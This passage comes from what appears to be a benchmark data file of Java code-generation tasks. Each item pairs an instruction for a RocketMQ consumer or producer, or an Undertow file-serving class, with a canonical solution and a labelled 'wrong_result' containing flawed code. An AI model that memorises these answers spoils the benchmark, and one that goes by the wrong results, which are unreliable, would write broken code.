   }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 43,
    "wrong_result": "public class LMQPushPopConsumer {\n    private String CLUSTER_NAME;\n    private String BROKER_NAME;\n    private String TOPIC;\n    private String LMQ_TOPIC;\n    private String NAMESRV_ADDR;\n    private String CONSUMER_GROUP;\n    private HashMap<Long, String> BROKER_ADDR_MAP;\n    private DefaultMQPushConsumer consumer;\n    private DefaultMQAdminExt mqAdminExt;\n\n    public void initializeConsumer() throws MQClientException {\n        consumer = new DefaultMQPushConsumer(CONSUMER_GROUP);\n        consumer.setNamesrvAddr(NAMESRV_ADDR);\n        LMQ_TOPIC = \"LMQ_PREFIX\" + TOPIC;\n        consumer.subscribe(LMQ_TOPIC, \"*\");\n        consumer.registerMessageListener((MessageExt msg, ConsumeContext context) -> {\n            // Process message logic here\n            return ConsumeConcurrentlyStatus.CONSUME_SUCCESS;\n        });\n    }\n\n    public void switchPop() {\n        try {\n            if (mqAdminExt == null) {\n                mqAdminExt = new DefaultMQAdminExt();\n                mqAdminExt.setNamesrvAddr(NAMESRV_ADDR);\n                mqAdminExt.start();\n            }\n            mqAdminExt.setBrokerTopicMode(BROKER_NAME, BrokerTopicMode.POP);\n        } catch (MQClientException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void shutdown() {\n        if (consumer != null) {\n            consumer.shutdown();\n        }\n        if (mqAdminExt != null) {\n            mqAdminExt.shutdown();\n        }\n    }\n}"
  },
  {
    "Task_id": 375,
    "Instruction": "Task Description: Create a Java class that implements a RocketMQ push consumer with Spring integration capabilities, allowing for configuration through properties and proper lifecycle management.\n\nClass Description: The Consumer class is a Spring FactoryBean that creates and manages a RocketMQ DefaultMQPushConsumer instance. It implements InitializingBean for initialization and DisposableBean for cleanup, providing a convenient way to integrate RocketMQ consumers into Spring applications. The class offers extensive configuration options for consumer behavior and performance tuning.\n\nAttributes:\n\nconsumerGroup: String - The consumer group name for this consumer\nnamesrvAddr: String - The address of the NameServer\ninstanceName: String - The instance name for this consumer\nmessageModel: MessageModel - The message model (CLUSTERING or BROADCASTING)\nconsumeThreadMin: int - Minimum thread pool size for message consumption\nconsumeThreadMax: int - Maximum thread pool size for message consumption\npullThresholdForQueue: int - Flow control threshold for queue\npullThresholdSizeForQueue: int - Flow control threshold for queue size\nconsumeMessageBatchMaxSize: int - Maximum number of messages consumed in one batch\npullBatchSize: int - Maximum number of messages pulled in one batch\nmaxReconsumeTimes: int - Maximum number of retry attempts\nconsumeTimeout: long - Timeout for message consumption\ntopic: String - The topic to subscribe to\ntags: String - The tag filter for subscribed messages\nmessageListener: MessageListenerConcurrently - The listener for processing received messages\nconsumer: DefaultMQPushConsumer - The actual RocketMQ consumer instance\n\nMethods:\n\nafterPropertiesSet(): void - Initializes and starts the consumer after properties are set (from InitializingBean)\ndestroy(): void - Shuts down the consumer when the Spring context is destroyed (from DisposableBean)\ngetObject(): DefaultMQPushConsumer - Returns the consumer instance (from FactoryBean)\ngetObjectType(): Class<?> - Returns the consumer class type (from FactoryBean)\nisSingleton(): boolean - Indicates this is a singleton bean (from FactoryBean)\nsetConsumerGroup(String): void - Sets the consumer group name\nsetNamesrvAddr(String): void - Sets the NameServer address\nsetInstanceName(String): void - Sets the instance name\nsetMessageModel(String): void - Sets the message model\nsetConsumeThreadMin(int): void - Sets minimum consumption threads\nsetConsumeThreadMax(int): void - Sets maximum consumption threads\nsetPullThresholdForQueue(int): void - Sets queue flow control threshold\nsetPullThresholdSizeForQueue(int): void - Sets queue size flow control threshold\nsetConsumeMessageBatchMaxSize(int): void - Sets batch consumption size\nsetPullBatchSize(int): void - Sets pull batch size\nsetMaxReconsumeTimes(int): void - Sets maximum retry attempts\nsetConsumeTimeout(long): void - Sets consumption timeout\nsetTopic(String): void - Sets subscription topic\nsetTags(String): void - Sets message tag filter\nsetMessageListener(MessageListenerConcurrently): void - Sets the message listener",
    "Canonical_solution": "import org.apache.rocketmq.client.consumer.DefaultMQPushConsumer;\nimport org.apache.rocketmq.client.consumer.listener.MessageListenerConcurrently;\nimport org.apache.rocketmq.common.consumer.ConsumeFromWhere;\nimport org.apache.rocketmq.common.protocol.heartbeat.MessageModel;\nimport org.springframework.beans.factory.DisposableBean;\nimport org.springframework.beans.factory.FactoryBean;\nimport org.springframework.beans.factory.InitializingBean;\n\npublic class Consumer implements FactoryBean<DefaultMQPushConsumer>, InitializingBean, DisposableBean {\n\n    private DefaultMQPushConsumer consumer;\n\n    private String consumerGroup;\n    private String namesrvAddr;\n    private String instanceName;\n    private MessageModel messageModel = MessageModel.CLUSTERING;\n    private int consumeThreadMin = 20;\n    private int consumeThreadMax = 64;\n    private int pullThresholdForQueue = 1000;\n    private int pullThresholdSizeForQueue = 100;\n    private int consumeMessageBatchMaxSize = 1;\n    private int pullBatchSize = 32;\n    private int maxReconsumeTimes = -1;\n    private long consumeTimeout = 15;\n    private String topic;\n    private String tags;\n    private MessageListenerConcurrently messageListener;\n\n    @Override\n    public void afterPropertiesSet() throws Exception {\n        consumer = new DefaultMQPushConsumer(consumerGroup);\n        consumer.setInstanceName(instanceName);\n        consumer.setNamesrvAddr(namesrvAddr);\n        consumer.setMessageModel(messageModel);\n        consumer.setConsumeThreadMin(consumeThreadMin);\n        consumer.setConsumeThreadMax(consumeThreadMax);\n        consumer.setPullThresholdForQueue(pullThresholdForQueue);\n        consumer.setPullThresholdSizeForQueue(pullThresholdSizeForQueue);\n        consumer.setConsumeMessageBatchMaxSize(consumeMessageBatchMaxSize);\n        consumer.setPullBatchSize(pullBatchSize);\n        consumer.setMaxReconsumeTimes(maxReconsumeTimes);\n        consumer.setConsumeTimeout(consumeTimeout);\n        consumer.subscribe(topic, tags);\n        consumer.registerMessageListener(messageListener);\n        consumer.start();\n    }\n\n    @Override\n    public void destroy() throws Exception {\n        if (consumer != null) {\n            consumer.shutdown();\n        }\n    }\n\n    @Override\n    public DefaultMQPushConsumer getObject() throws Exception {\n        return consumer;\n    }\n\n    @Override\n    public Class<?> getObjectType() {\n        return DefaultMQPushConsumer.class;\n    }\n\n    @Override\n    public boolean isSingleton() {\n        return true;\n    }\n\n    public void setConsumerGroup(String consumerGroup) {\n        this.consumerGroup = consumerGroup;\n    }\n\n    public void setNamesrvAddr(String namesrvAddr) {\n        this.namesrvAddr = namesrvAddr;\n    }\n\n    public void setInstanceName(String instanceName) {\n        this.instanceName = instanceName;\n    }\n\n    public void setMessageModel(String messageModel) {\n        this.messageModel = MessageModel.valueOf(messageModel);\n    }\n\n    public void setConsumeThreadMin(int consumeThreadMin) {\n        this.consumeThreadMin = consumeThreadMin;\n    }\n\n    public void setConsumeThreadMax(int consumeThreadMax) {\n        this.consumeThreadMax = consumeThreadMax;\n    }\n\n    public void setPullThresholdForQueue(int pullThresholdForQueue) {\n        this.pullThresholdForQueue = pullThresholdForQueue;\n    }\n\n    public void setPullThresholdSizeForQueue(int pullThresholdSizeForQueue) {\n        this.pullThresholdSizeForQueue = pullThresholdSizeForQueue;\n    }\n\n    public void setConsumeMessageBatchMaxSize(int consumeMessageBatchMaxSize) {\n        this.consumeMessageBatchMaxSize = consumeMessageBatchMaxSize;\n    }\n\n    public void setPullBatchSize(int pullBatchSize) {\n        this.pullBatchSize = pullBatchSize;\n    }\n\n    public void setMaxReconsumeTimes(int maxReconsumeTimes) {\n        this.maxReconsumeTimes = maxReconsumeTimes;\n    }\n\n    public void setConsumeTimeout(long consumeTimeout) {\n        this.consumeTimeout = consumeTimeout;\n    }\n\n    public void setTopic(String topic) {\n        this.topic = topic;\n    }\n\n    public void setTags(String tags) {\n        this.tags = tags;\n    }\n\n    public void setMessageListener(MessageListenerConcurrently messageListener) {\n        this.messageListener = messageListener;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 43,
    "wrong_result": "public class RocketMQConsumer implements FactoryBean<DefaultMQPushConsumer>, InitializingBean, DisposableBean {\n    private String consumerGroup;\n    private String namesrvAddr;\n    private String instanceName;\n    private MessageModel messageModel;\n    private int consumeThreadMin;\n    private int consumeThreadMax;\n    private int pullThresholdForQueue;\n    private int pullThresholdSizeForQueue;\n    private int consumeMessageBatchMaxSize;\n    private int pullBatchSize;\n    private int maxReconsumeTimes;\n    private long consumeTimeout;\n    private String topic;\n    private String tags;\n    private MessageListenerConcurrently messageListener;\n    private DefaultMQPushConsumer consumer;\n\n    public void setConsumerGroup(String consumerGroup) {\n        this.consumerGroup = consumerGroup;\n    }\n\n    public void setNamesrvAddr(String namesrvAddr) {\n        this.namesrvAddr = namesrvAddr;\n    }\n\n    public void setInstanceName(String instanceName) {\n        this.instanceName = instanceName;\n    }\n\n    public void setMessageModel(String messageModel) {\n        if (\"CLUSTERING\".equals(messageModel)) {\n            this.messageModel = MessageModel.CLUSTERING;\n        } else if (\"BROADCASTING\".equals(messageModel)) {\n            this.messageModel = MessageModel.BROADCASTING;\n        } else {\n            throw new IllegalArgumentException(\"Invalid message model: \" + messageModel);\n        }\n    }\n\n    public void setConsumeThreadMin(int consumeThreadMin) {\n        this.consumeThreadMin = consumeThreadMin;\n    }\n\n    public void setConsumeThreadMax(int consumeThreadMax) {\n        this.consumeThreadMax = consumeThreadMax;\n    }\n\n    public void setPullThresholdForQueue(int pullThresholdForQueue) {\n        this.pullThresholdForQueue = pullThresholdForQueue;\n    }\n\n    public void setPullThresholdSizeForQueue(int pullThresholdSizeForQueue) {\n        this.pullThresholdSizeForQueue = pullThresholdSizeForQueue;\n    }\n\n    public void setConsumeMessageBatchMaxSize(int consumeMessageBatchMaxSize) {\n        this.consumeMessageBatchMaxSize = consumeMessageBatchMaxSize;\n    }\n\n    public void setPullBatchSize(int pullBatchSize) {\n        this.pullBatchSize = pullBatchSize;\n    }\n\n    public void setMaxReconsumeTimes(int maxReconsumeTimes) {\n        this.maxReconsumeTimes = maxReconsumeTimes;\n    }\n\n    public void setConsumeTimeout(long consumeTimeout) {\n        this.consumeTimeout = consumeTimeout;\n    }\n\n    public void setTopic(String topic) {\n        this.topic = topic;\n    }\n\n    public void setTags(String tags) {\n        this.tags = tags;\n    }\n\n    public void setMessageListener(MessageListenerConcurrently messageListener) {\n        this.messageListener = messageListener;\n    }\n\n    @Override\n    public void afterPropertiesSet() {\n        consumer = new DefaultMQPushConsumer(consumerGroup);\n        consumer.setNamesrvAddr(namesrvAddr);\n        consumer.setInstanceName(instanceName);\n        consumer.setMessageModel(messageModel);\n        consumer.setConsumeThreadMin(consumeThreadMin);\n        consumer.setConsumeThreadMax(consumeThreadMax);\n        consumer.setPullThresholdForQueue(pullThresholdForQueue);\n        consumer.setPullThresholdSizeForQueue(pullThresholdSizeForQueue);\n        consumer.setConsumeMessageBatchMaxSize(consumeMessageBatchMaxSize);\n        consumer.setPullBatchSize(pullBatchSize);\n        consumer.setMaxReconsumeTimes(maxReconsumeTimes);\n        consumer.setConsumeTimeout(consumeTimeout);\n        consumer.setTopic(topic);\n        consumer.setTags(tags);\n        consumer.setMessageListener(messageListener);\n        consumer.subscribe(topic, tags);\n        try {\n            consumer.start();\n        } catch (Exception e) {\n            throw new RuntimeException(\"Failed to start RocketMQ consumer\", e);\n        }\n    }\n\n    @Override\n    public void destroy() {\n        if (consumer != null) {\n            try {\n                consumer.shutdown();\n            } catch (Exception e) {\n                // Handle exception, maybe log it\n            }\n        }\n    }\n\n    @Override\n    public DefaultMQPushConsumer getObject() {\n        return consumer;\n    }\n\n    @Override\n    public Class<?> getObjectType() {\n        return DefaultMQPushConsumer.class;\n    }\n\n    @Override\n    public boolean isSingleton() {\n        return true;\n    }\n}"
  },
  {
    "Task_id": 379,
    "Instruction": "Task Description: Create a Java class that implements a RocketMQ consumer to subscribe to messages from a specified topic and process them asynchronously.\n\nClass Description: The Consumer class is a RocketMQ message consumer that uses push-based consumption model. It allows subscribing to topics, registering message listeners, and managing the consumer lifecycle (startup and shutdown).\n\nAttributes:\n- consumer: DefaultMQPushConsumer - The RocketMQ push consumer instance that handles message consumption\n\nMethods:\n- Constructor: Consumer(String consumerGroup, String namesrvAddr) -> void - Initializes the consumer with a consumer group name and NameServer address. Sets the consumption offset strategy to start from the first offset.\n- subscribe: subscribe(String topic, String subExpression) -> void - Subscribes to a specific topic with optional tag filtering using a subscription expression.\n- registerMessageListener: registerMessageListener(MessageListenerConcurrently listener) -> void - Registers a concurrent message listener to handle incoming messages.\n- start: start() -> void - Starts the consumer to begin message consumption.\n- shutdown: shutdown() -> void - Shuts down the consumer gracefully.\n\nNested Class:\n- SimpleMessageListener: Implements MessageListenerConcurrently interface to provide basic message handling functionality. Prints received messages and returns CONSUME_SUCCESS status.",
    "Canonical_solution": "import org.apache.rocketmq.client.consumer.DefaultMQPushConsumer;\nimport org.apache.rocketmq.client.consumer.listener.ConsumeConcurrentlyContext;\nimport org.apache.rocketmq.client.consumer.listener.ConsumeConcurrentlyStatus;\nimport org.apache.rocketmq.client.consumer.listener.MessageListenerConcurrently;\nimport org.apache.rocketmq.client.exception.MQClientException;\nimport org.apache.rocketmq.common.consumer.ConsumeFromWhere;\nimport org.apache.rocketmq.common.message.MessageExt;\n\nimport java.util.List;\n\npublic class Consumer {\n\n    private DefaultMQPushConsumer consumer;\n\n    public Consumer(String consumerGroup, String namesrvAddr) throws MQClientException {\n        consumer = new DefaultMQPushConsumer(consumerGroup);\n        consumer.setNamesrvAddr(namesrvAddr);\n        consumer.setConsumeFromWhere(ConsumeFromWhere.CONSUME_FROM_FIRST_OFFSET);\n    }\n\n    public void subscribe(String topic, String subExpression) throws MQClientException {\n        consumer.subscribe(topic, subExpression);\n    }\n\n    public void registerMessageListener(MessageListenerConcurrently listener) {\n        consumer.registerMessageListener(listener);\n    }\n\n    public void start() throws MQClientException {\n        consumer.start();\n        System.out.println(String.format(\"Consumer %s Started.\", consumer.getConsumerGroup()));\n    }\n\n    public void shutdown() {\n        consumer.shutdown();\n    }\n\n    public static class SimpleMessageListener implements MessageListenerConcurrently {\n        @Override\n        public ConsumeConcurrentlyStatus consumeMessage(List<MessageExt> msgs,\n                                                       ConsumeConcurrentlyContext context) {\n            System.out.printf(Thread.currentThread().getName() + \" Receive New Messages: \" + msgs + \"%n\");\n            return ConsumeConcurrentlyStatus.CONSUME_SUCCESS;\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 43,
    "wrong_result": "public class Consumer {\n    private final DefaultMQPushConsumer consumer;\n\n    public Consumer(String consumerGroup, String namesrvAddr) {\n        consumer = new DefaultMQPushConsumer(consumerGroup);\n        consumer.setNamesrvAddr(namesrvAddr);\n        consumer.setConsumeFromWhere(ConsumeFromWhere.CONSUME_FROM_FIRST_OFFSET);\n    }\n\n    public void subscribe(String topic, String subExpression) {\n        consumer.subscribe(topic, subExpression);\n    }\n\n    public void registerMessageListener(MessageListenerConcurrently listener) {\n        consumer.registerMessageListener(listener);\n    }\n\n    public void start() {\n        consumer.start();\n    }\n\n    public void shutdown() {\n        consumer.shutdown();\n    }\n\n    public static class SimpleMessageListener implements MessageListenerConcurrently {\n        @Override\n        public ConsumeResult consumeMessage(List<MessageExt> messages, ConsumeOrderMode orderMode) {\n            for (MessageExt message : messages) {\n                System.out.println(\"Received message: \" + new String(message.getBody()));\n            }\n            return ConsumeResult.CONSUME_SUCCESS;\n        }\n    }\n}"
  },
  {
    "Task_id": 38,
    "Instruction": "Task Description: Implement a resource handler class that serves file content from a specified path, supporting both full file serving and range requests, using Java NIO's FileChannel for efficient file operations.\n\nClass Description: PathResource is a file resource handler that serves content from a file system path, supporting standard and ranged requests. It utilizes FileChannel for efficient reading and implements resource management through a PathResourceManager.\n\nAttributes:\n- file: Path - The file path to serve content from\n- manager: PathResourceManager - Manages resource access and transfer size thresholds\n\nMethods:\n- serve(Sender, HttpServerExchange, IoCallback) -> void - Serves the entire file content to the client\n- serveRange(Sender, HttpServerExchange, long, long, IoCallback) -> void - Serves a specific byte range of the file content\n- getContentLength() -> Long - Returns the size of the file in bytes or null if unavailable\n- serveImpl(Sender, HttpServerExchange, long, long, IoCallback, boolean) -> void - Internal implementation handling both full and ranged requests\n\nThe class uses nested BaseFileTask, ServerTask, and TransferTask classes to handle different serving strategies:\n- ServerTask: Reads file content in chunks using pooled buffers\n- TransferTask: Uses zero-copy transfer for efficient large file serving\n\nThe implementation demonstrates proper FileChannel usage including:\n1. Opening channels with StandardOpenOption.READ\n2. Position manipulation for range requests\n3. Proper resource cleanup with safeClose\n4. Buffer management with PooledByteBuffer\n5. Error handling for file operations",
    "Canonical_solution": "import io.undertow.io.IoCallback;\nimport io.undertow.io.Sender;\nimport io.undertow.server.HttpServerExchange;\nimport io.undertow.connector.PooledByteBuffer;\nimport org.xnio.IoUtils;\n\nimport java.io.IOException;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.FileChannel;\nimport java.nio.file.Files;\nimport java.nio.file.NoSuchFileException;\nimport java.nio.file.Path;\nimport java.nio.file.StandardOpenOption;\n\npublic class PathResource implements RangeAwareResource {\n\n    private final Path file;\n    private final PathResourceManager manager;\n\n    public PathResource(final Path file, final PathResourceManager manager, String path) {\n        this.file = file;\n        this.manager = manager;\n    }\n\n    @Override\n    public void serve(final Sender sender, final HttpServerExchange exchange, final IoCallback callback) {\n        serveImpl(sender, exchange, -1, -1, callback, false);\n    }\n\n    @Override\n    public void serveRange(final Sender sender, final HttpServerExchange exchange, final long start, final long end, final IoCallback callback) {\n        serveImpl(sender, exchange, start, end, callback, true);\n    }\n\n    private void serveImpl(final Sender sender, final HttpServerExchange exchange, final long start, final long end, final IoCallback callback, final boolean range) {\n        abstract class BaseFileTask implements Runnable {\n            protected volatile FileChannel fileChannel;\n\n            protected boolean openFile() {\n                try {\n                    fileChannel = FileChannel.open(file, StandardOpenOption.READ);\n                    if(range) {\n                        fileChannel.position(start);\n                    }\n                } catch (NoSuchFileException e) {\n                    exchange.setStatusCode(StatusCodes.NOT_FOUND);\n                    callback.onException(exchange, sender, e);\n                    return false;\n                } catch (IOException e) {\n                    exchange.setStatusCode(StatusCodes.INTERNAL_SERVER_ERROR);\n                    callback.onException(exchange, sender, e);\n                    return false;\n                }\n                return true;\n            }\n        }\n\n        class ServerTask extends BaseFileTask implements IoCallback {\n            private PooledByteBuffer pooled;\n            long remaining = end - start + 1;\n\n            @Override\n            public void run() {\n                if(range && remaining == 0) {\n                    if (pooled != null) {\n                        pooled.close();\n                        pooled = null;\n                    }\n                    IoUtils.safeClose(fileChannel);\n                    callback.onComplete(exchange, sender);\n                    return;\n                }\n                if (fileChannel == null) {\n                    if (!openFile()) {\n                        return;\n                    }\n                    pooled = exchange.getConnection().getByteBufferPool().allocate();\n                }\n                if (pooled != null) {\n                    ByteBuffer buffer = pooled.getBuffer();\n                    try {\n                        buffer.clear();\n                        int res = fileChannel.read(buffer);\n                        if (res == -1) {\n                            pooled.close();\n                            IoUtils.safeClose(fileChannel);\n                            callback.onComplete(exchange, sender);\n                            return;\n                        }\n                        buffer.flip();\n                        if(range) {\n                            if(buffer.remaining() > remaining) {\n                                buffer.limit((int) (buffer.position() + remaining));\n                            }\n                            remaining -= buffer.remaining();\n                        }\n                        sender.send(buffer, this);\n                    } catch (IOException e) {\n                        onException(exchange, sender, e);\n                    }\n                }\n            }\n\n            @Override\n            public void onComplete(final HttpServerExchange exchange, final Sender sender) {\n                if (exchange.isInIoThread()) {\n                    exchange.dispatch(this);\n                } else {\n                    run();\n                }\n            }\n\n            @Override\n            public void onException(final HttpServerExchange exchange, final Sender sender, final IOException exception) {\n                if (pooled != null) {\n                    pooled.close();\n                    pooled = null;\n                }\n                IoUtils.safeClose(fileChannel);\n                if (!exchange.isResponseStarted()) {\n                    exchange.setStatusCode(StatusCodes.INTERNAL_SERVER_ERROR);\n                }\n                callback.onException(exchange, sender, exception);\n            }\n        }\n\n        class TransferTask extends BaseFileTask {\n            @Override\n            public void run() {\n                if (!openFile()) {\n                    return;\n                }\n                sender.transferFrom(fileChannel, new IoCallback() {\n                    @Override\n                    public void onComplete(HttpServerExchange exchange, Sender sender) {\n                        try {\n                            IoUtils.safeClose(fileChannel);\n                        } finally {\n                            callback.onComplete(exchange, sender);\n                        }\n                    }\n\n                    @Override\n                    public void onException(HttpServerExchange exchange, Sender sender, IOException exception) {\n                        try {\n                            IoUtils.safeClose(fileChannel);\n                        } finally {\n                            callback.onException(exchange, sender, exception);\n                        }\n                    }\n                });\n            }\n        }\n\n        BaseFileTask task;\n        try {\n            task = manager.getTransferMinSize() > Files.size(file) || range ? new ServerTask() : new TransferTask();\n        } catch (IOException e) {\n            throw new RuntimeException(e);\n        }\n        if (exchange.isInIoThread()) {\n            exchange.dispatch(task);\n        } else {\n            task.run();\n        }\n    }\n\n    @Override\n    public Long getContentLength() {\n        try {\n            if (Files.isSymbolicLink(file) && Files.notExists(file)) {\n                return null;\n            }\n            return Files.size(file);\n        } catch (IOException e) {\n            throw new RuntimeException(e);\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 9,
    "wrong_result": "public class PathResource { private final Path file; private final PathResourceManager manager; public PathResource(Path file, PathResourceManager manager) { this.file = file; this.manager = manager; } public void serve(Sender sender, HttpServerExchange exchange, IoCallback callback) { serveImpl(sender, exchange, 0, Long.MAX_VALUE, callback, true); } public void serveRange(Sender sender, HttpServerExchange exchange, long start, long end, IoCallback callback) { serveImpl(sender, exchange, start, end, callback, false); } public Long getContentLength() { try { return file.toFile().length(); } catch (Exception e) { return null; } } private void serveImpl(Sender sender, HttpServerExchange exchange, long start, long end, IoCallback callback, boolean fullRequest) { try (FileChannel channel = FileChannel.open(file, StandardOpenOption.READ)) { long fileSize = channel.size(); long requestedSize = fullRequest ? fileSize : end - start + 1; if (requestedSize <= 0) return; if (!fullRequest) channel.position(start); if (fileSize > 1024 * 1024 * 1024) new TransferTask(sender, exchange, channel, start, end, callback).run(); else new ServerTask(sender, exchange, channel, start, end, callback).run(); } catch (IOException e) { } } private static class ServerTask { private final Sender sender; private final HttpServerExchange exchange; private final FileChannel channel; private final long start; private final long end; private final IoCallback callback; public ServerTask(Sender sender, HttpServerExchange exchange, FileChannel channel, long start, long end, IoCallback callback) { this.sender = sender; this.exchange = exchange; this.channel = channel; this.start = start; this.end = end; this.callback = callback; } public void run() { ByteBuffer buffer = PooledByteBuffer.allocate(8192); try { while (channel.position() <= end) { int bytesRead = channel.read(buffer); if (bytesRead == -1) break; buffer.flip(); callback.onDataSent(buffer); buffer.clear(); } } catch (IOException e) { } finally { safeClose(channel); } } } private static class TransferTask { private final Sender sender; private final HttpServerExchange exchange; private final FileChannel channel; private final long start; private final long end; private final IoCallback callback; public TransferTask(Sender sender, HttpServerExchange exchange, FileChannel channel, long start, long end, IoCallback callback) { this.sender = sender; this.exchange = exchange; this.channel = channel; this.start = start; this.end = end; this.callback = callback; } public void run() { try { channel.transferTo(start, end - start + 1, sender); } catch (IOException e) { } finally { safeClose(channel); } } } private static class BaseFileTask { protected void safeClose(AutoCloseable resource) { try { if (resource != null) resource.close(); } catch (IOException e) { } } } private void safeClose(AutoCloseable resource) { BaseFileTask.safeClose(resource); } }"
  },
  {
    "Task_id": 380,
    "Instruction": "Task Description: Create a Java class that implements a RocketMQ consumer to asynchronously receive and process messages from a specified topic, measuring the delay between message delivery and consumption.\n\nClass Description: The TimerConsumer class is a RocketMQ push consumer that subscribes to a specified topic, processes incoming messages, and calculates the time delay between when messages were delivered and when they were consumed. It provides command-line configuration for NameServer address and topic name.\n\nAttributes:\n- topic: String - The RocketMQ topic to subscribe to for messages\n- consumer: DefaultMQPushConsumer - The RocketMQ push consumer instance that handles message consumption\n\nMethods:\n- TimerConsumer(String[] args) - Constructor - Initializes the consumer with command-line arguments for NameServer address and topic\n  Input: args: String[] - Command-line arguments containing optional NameServer address and topic\n  Output: None\n\n- start() - void - Starts the consumer, subscribes to the topic, and registers a message listener\n  Input: None\n  Output: None (throws MQClientException if startup fails)\n\n- buildCommandlineOptions(Options options) - Options - Helper method to define command-line options\n  Input: options: Options - Apache Commons CLI Options object to extend\n  Output: Options - The extended Options object with consumer-specific options",
    "Canonical_solution": "import org.apache.commons.cli.CommandLine;\nimport org.apache.commons.cli.DefaultParser;\nimport org.apache.commons.cli.Option;\nimport org.apache.commons.cli.Options;\nimport org.apache.rocketmq.client.consumer.DefaultMQPushConsumer;\nimport org.apache.rocketmq.client.consumer.listener.ConsumeConcurrentlyContext;\nimport org.apache.rocketmq.client.consumer.listener.ConsumeConcurrentlyStatus;\nimport org.apache.rocketmq.client.consumer.listener.MessageListenerConcurrently;\nimport org.apache.rocketmq.client.exception.MQClientException;\nimport org.apache.rocketmq.common.ThreadFactoryImpl;\nimport org.apache.rocketmq.common.message.MessageExt;\nimport org.apache.rocketmq.srvutil.ServerUtil;\n\nimport java.util.List;\nimport java.util.concurrent.ScheduledExecutorService;\nimport java.util.concurrent.ScheduledThreadPoolExecutor;\nimport java.util.concurrent.TimeUnit;\nimport java.util.concurrent.atomic.AtomicLong;\n\npublic class TimerConsumer {\n    private final String topic;\n    private final DefaultMQPushConsumer consumer;\n\n    public TimerConsumer(String[] args) {\n        Options options = ServerUtil.buildCommandlineOptions(new Options());\n        final CommandLine commandLine = ServerUtil.parseCmdLine(\"benchmarkTimerConsumer\", args, buildCommandlineOptions(options), new DefaultParser());\n        if (null == commandLine) {\n            System.exit(-1);\n        }\n\n        final String namesrvAddr = commandLine.hasOption('n') ? commandLine.getOptionValue('t').trim() : \"localhost:9876\";\n        topic = commandLine.hasOption('t') ? commandLine.getOptionValue('t').trim() : \"BenchmarkTest\";\n        System.out.printf(\"namesrvAddr: %s, topic: %s%n\", namesrvAddr, topic);\n\n        consumer = new DefaultMQPushConsumer(\"benchmark_consumer\");\n        consumer.setInstanceName(Long.toString(System.currentTimeMillis()));\n        consumer.setNamesrvAddr(namesrvAddr);\n    }\n\n    public void start() throws MQClientException {\n        consumer.subscribe(topic, \"*\");\n\n        consumer.registerMessageListener(new MessageListenerConcurrently() {\n            @Override\n            public ConsumeConcurrentlyStatus consumeMessage(List<MessageExt> msgs, ConsumeConcurrentlyContext context) {\n                MessageExt msg = msgs.get(0);\n                long now = System.currentTimeMillis();\n\n                long deliverTimeMs = Long.parseLong(msg.getProperty(\"MY_RECORD_TIMER_DELIVER_MS\"));\n                long delayedDuration = now - deliverTimeMs;\n\n                return ConsumeConcurrentlyStatus.CONSUME_SUCCESS;\n            }\n        });\n\n        consumer.start();\n        System.out.printf(\"Start receiving messages%n\");\n    }\n\n    private Options buildCommandlineOptions(Options options) {\n        Option opt = new Option(\"n\", \"namesrvAddr\", true, \"Nameserver address, default: localhost:9876\");\n        opt.setRequired(false);\n        options.addOption(opt);\n\n        opt = new Option(\"t\", \"topic\", true, \"Send messages to which topic, default: BenchmarkTest\");\n        opt.setRequired(false);\n        options.addOption(opt);\n\n        return options;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 43,
    "wrong_result": "import org.apache.commons.cli.Options;\nimport org.apache.commons.cli.GnuParser;\nimport org.apache.commons.cli.ParseException;\nimport org.apache.rocketmq.client.consumer.DefaultMQPushConsumer;\nimport org.apache.rocketmq.client.exception.MQClientException;\nimport org.apache.rocketmq.common.message.MessageContext;\nimport org.apache.rocketmq.common.message.MessageExt;\nimport org.apache.rocketmq.client.consumer.ConsumeConcurrentlyStatus;\n\npublic class TimerConsumer {\n    private String namesrv;\n    private String topic;\n    private DefaultMQPushConsumer consumer;\n\n    public TimerConsumer(String[] args) {\n        Options options = new Options();\n        buildCommandlineOptions(options);\n        CommandLine cmd = parseArgs(args, options);\n        if (cmd == null) {\n            System.out.println(\"Usage: TimerConsumer -n <namesrv> -t <topic>\");\n            System.exit(1);\n        }\n        String namesrv = cmd.getOptionValue(\"n\");\n        String topic = cmd.getOptionValue(\"t\");\n        this.namesrv = namesrv;\n        this.topic = topic;\n    }\n\n    public void start() throws MQClientException {\n        consumer = new DefaultMQPushConsumer(namesrv);\n        consumer.subscribe(topic, \"*\");\n        consumer.registerMessageListener((MessageExt msg, MessageContext context) -> {\n            long arrivalTime = msg.getArrivalTime();\n            long currentTime = System.currentTimeMillis();\n            long delay = currentTime - arrivalTime;\n            System.out.println(\"Message processed with delay: \" + delay + \" ms\");\n            return ConsumeConcurrentlyStatus.CONSUME_SUCCESS;\n        });\n        consumer.start();\n    }\n\n    private Options buildCommandlineOptions(Options options) {\n        options.addOption(\"n\", \"namesrv\", true, \"NameServer address\");\n        options.addOption(\"t\", \"topic\", true, \"Topic name\");\n        return options;\n    }\n\n    private CommandLine parseArgs(String[] args, Options options) {\n        try {\n            return new GnuParser().parseOptions(options, args);\n        } catch (ParseException e) {\n            System.err.println(\"Error parsing arguments: \" + e.getMessage());\n            return null;\n        }\n    }\n}"
  },
  {
    "Task_id": 382,
    "Instruction": "Task Description: Create a Java class that implements a RocketMQ producer capable of sending messages to both regular topics and LMQ (Light Message Queue) topics. The producer should support initialization, message sending with custom properties, and proper shutdown.\n\nClass Description: The LMQProducer class is a RocketMQ producer implementation that demonstrates how to send messages to both regular topics and LMQ topics. It handles producer lifecycle management and message sending with multi-dispatch capabilities.\n\nAttributes:\n- PRODUCER_GROUP: String - The name of the producer group\n- DEFAULT_NAMESRVADDR: String - Default NameServer address (format: \"ip:port\")\n- TOPIC: String - The main topic to which messages will be sent\n- TAG: String - The tag for messages\n- LMQ_TOPIC_1: String - First LMQ topic (prefixed with MixAll.LMQ_PREFIX)\n- LMQ_TOPIC_2: String - Second LMQ topic (prefixed with MixAll.LMQ_PREFIX)\n- producer: DefaultMQProducer - The RocketMQ producer instance\n\nMethods:\n- initialize() throws MQClientException -> void - Initializes the producer by creating a new DefaultMQProducer instance, setting the NameServer address, and starting the producer\n- sendMessage(int messageId) throws Exception -> SendResult - Creates and sends a message with the given 